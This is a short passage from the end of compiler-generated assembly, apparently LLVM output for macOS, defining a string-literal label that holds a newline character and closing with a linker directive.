	L_.str.9	:    # # @.str.9
	.asciz	"\n"
.subsections_via_symbols
